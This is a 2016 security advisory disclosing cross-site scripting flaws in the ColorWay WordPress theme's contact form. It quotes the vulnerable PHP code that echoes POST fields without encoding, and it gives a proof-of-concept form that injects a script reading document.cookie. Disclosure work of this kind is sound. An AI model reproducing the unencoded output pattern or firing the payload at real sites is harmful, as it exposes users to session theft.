------------------------------------------------------------------------
Cross-Site Scripting vulnerability in ColorWay WordPress Theme
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
Multiple Cross-Site Scripting vulnerabilities were found in the ColorWay
WordPress Theme. These issues allows an attacker to perform a wide
variety of actions, such as stealing users' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a victim into opening a malicious
website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0024

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
These issues were successfully tested on ColorWay WordPress Theme
version 3.4.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in ColorWay WordPress Theme version 3.4.2.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_colorway_wordpress_theme.html

These issues exists due to the lack of output encoding of user input. An example can be seen in the file contact.php. Several POST parameters are using in the output without applying proper encoding.

<form action="<?php the_permalink(); ?>" id="contactForm" method="post">
   <ul class="contactform">
      <li>
         <label for="contactName"><?php _e('Name:', 'colorway'); ?></label>
         <input type="text" name="contactName" id="contactName" value="<?php if (isset($_POST['contactName'])) echo $_POST['contactName']; ?>" class="required requiredField" />
         <?php if ($nameError != '') { ?>
            <span class="error"> <?php echo $nameError; ?> </span>
         <?php } ?>
      </li>
      <li>
         <label for="email"><?php _e('Email', 'colorway'); ?></label>
         <input type="text" name="email" id="email" value="<?php if (isset($_POST['email'])) echo $_POST['email']; ?>" class="required requiredField email" />
         <?php if ($emailError != '') { ?>
            <span class="error"> <?php echo $emailError; ?> </span>
         <?php } ?>
      </li>
      <li>
         <label for="commentsText"><?php _e('Message:', 'colorway'); ?></label>
         <textarea name="comments" id="commentsText" rows="20" cols="30" class="required requiredField"><?php
            if (isset($_POST['comments'])) {
               if (function_exists('stripslashes')) {
                  echo stripslashes($_POST['comments']);
               } else {
                  echo $_POST['comments'];
               }
            }
         ?>
         </textarea>
         <?php if ($commentError != '') { ?>
            <span class="error"> <?php echo $commentError; ?> </span>
         <?php } ?>
      </li>
      <li>
         <input type="submit" value="<?php _e('Send Email', 'colorway'); ?>"/>
      </li>
   </ul>
   <input type="hidden" name="submitted" id="submitted" value="true" />
</form>

Proof of concept

<html>
   <body>
      <form action="http://<target>/contact/" method="POST">
         <input type="hidden" name="contactName" value="&quot;><script>alert(document.cookie);</script>" />
         <input type="hidden" name="email" value="" />
         <input type="hidden" name="comments" value=" " />
         <input type="hidden" name="submitted" value="true" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
